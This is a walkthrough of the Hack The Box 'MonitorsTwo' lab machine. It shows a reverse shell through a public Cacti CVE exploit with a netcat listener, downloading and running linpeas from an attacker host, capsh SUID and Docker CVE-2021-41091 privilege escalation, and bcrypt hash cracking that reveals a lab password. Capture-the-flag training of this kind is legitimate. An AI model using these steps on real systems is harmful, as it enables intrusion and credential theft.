### In this walkthrough, we will hack MonitorsTwo box from HTB
## Discovery
first of all we will test connection
```
ping 10.10.11.211
```
results:

![image](https://github.com/user-attachments/assets/d43f0f42-1f2f-428d-9881-04b5860d3f3e)

(ttl=63, around 63 tells us it is linux based machine, if ttl would be around 128 we would deal with windows based system)

Since we confirmed connection we can start enumerating with nmap command:
```
sudo nmap -sV -sC 10.10.11.211
```
flags:
- -sV - Service Version Detection
- -sC - Default Script Scan

results:

![image](https://github.com/user-attachments/assets/714e4d8a-f132-4baf-9f40-2edfad073b1e)

we can see that this box have two services open:
- ssh on port 22
- http on port 80

## Foothold

we dont have credentials to ssh for now and bruteforcing this is close to imposible, only one option is to see what is happening on http web server

![image](https://github.com/user-attachments/assets/2d8f33e6-e699-423f-a35d-89376f167405)

here i didnt even try deafult cacti credentials (wich work:admin, admin) just straight up started looking for CVE on internet and i found this github repo:
https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22
```
git clone https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22.git
```

![image](https://github.com/user-attachments/assets/32af2039-c63f-4cf2-8a34-553974527357)

i adjusted command to my case according to readme file and started netcat listener, commands:
```
nc -lvnp 443
python3 CVE-2022-46169.py -u http://10.10.11.211 --LHOST=10.10.16.5 --LPORT=443
```
And just like that we got container shell! (we can see it is container becouse of hostname of the container after www-data@ which is random string)
## User.txt
next i moved to /tmp, installed linpeas and ran it, commands:
```
cd /tmp
wget http://10.10.16.6/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

![image](https://github.com/user-attachments/assets/3682e7fc-0a81-4151-975d-e84238df1a33)

We can see that 95% PE vector is highlighted in yellow-red, we look capsh up in gtfobins and found this SUID (Set User ID) command:
```
./capsh --gid=0 --uid=0 --
```

![image](https://github.com/user-attachments/assets/201f86fe-6758-43d9-9794-795878624f16)

So we go to /sbin and execute command:

![image](https://github.com/user-attachments/assets/8fb046bc-26f6-48c4-92fc-5e78d42f3ad6)

After that, I looked around the system to find anything unusual or something that stood out. I found a strange file called entrypoint.sh, so I opened it.

![image](https://github.com/user-attachments/assets/d206d119-755c-4b54-b8c2-f080f4f572b3)

Inside, we found a pretty interesting command along with credentials. We checked the command, and it worked—we got access to the MySQL database. I looked through the tables and found one containing usernames and password hashes, which seemed interesting.

![image](https://github.com/user-attachments/assets/51b5e0eb-6944-4504-89cb-86c7a5b44009)

I looked on the internet to find out what type of hash it is, and it turned out that we have got bcrypt hashes, which is a pretty strong hashing standard. Hopefully, at least one password will be weak.
Fun fact: Passwords hashed with this standard were compromised from the Internet Archive not long ago, from when I’m writing this post.

Here’s a little trick to find out the Hashcat mode faster, you just need to use --help flag and pipe it with grep "type":

![image](https://github.com/user-attachments/assets/e848bfe1-f98c-4efb-9186-19cc2935d592)

We use mode 3200, write the results to cracked.txt, and use the wordlist rockyou.txt (HTB uses passwords from this wordlist to prevent unnecessary long hours of cracking hashes).

![image](https://github.com/user-attachments/assets/dee357fe-f05e-409e-ac65-2bc2607babb8)

Hashcat was able to crack only one hash, it was marcus password:
```
ssh marcus@monitorstwo.htb
Password: funkymonkey
```
We ssh to marcus using his password, succesfuly obtaining user flag:

![image](https://github.com/user-attachments/assets/4ed7a52c-7887-4615-9e1d-87b89d62edca)

## Root.txt
This stage took me the most time on this box, although it was kind of obvious i ran:
```
id
uname -a
sudo -l
cat .bash_history
ps aux | grep "root"
./linpeas.sh (looked through, this took some time)
```
And finally, I remembered that there is a Docker container running, and we can gain root access on it, so I checked the Docker version:
```
docker --version
```

![image](https://github.com/user-attachments/assets/ba4cbb23-bd74-443c-8e6a-8a14c184623c)

Looked that version up on internet for any CVE and found this git hub page (you can check that for more insights on this exploit):
https://github.com/UncleJ4ck/CVE-2021-41091

So i followed up steps provided by readme file:

![image](https://github.com/user-attachments/assets/e32fb60c-13ba-449d-8539-f3916f2455d3)

We need to obtain access to the Docker container again, leverage privileges to root, and pass this command. Then, say 'yes' in our SSH session.
```
chmod u+s /bin/bash
```

![image](https://github.com/user-attachments/assets/c23dfb03-3702-4d87-8e9b-f1a04a38a936)

I didn't get a shell right away, so I navigated to the provided path and executed the given command.
```
./bin/bash -p
```
And we got euid=0(root) which is equal to root priveleges!
## Conclusion
This box was really fun, it was simple but interesting i learned a bit about docker containers hope you also learned something, have good day and good luck on your next challenges!
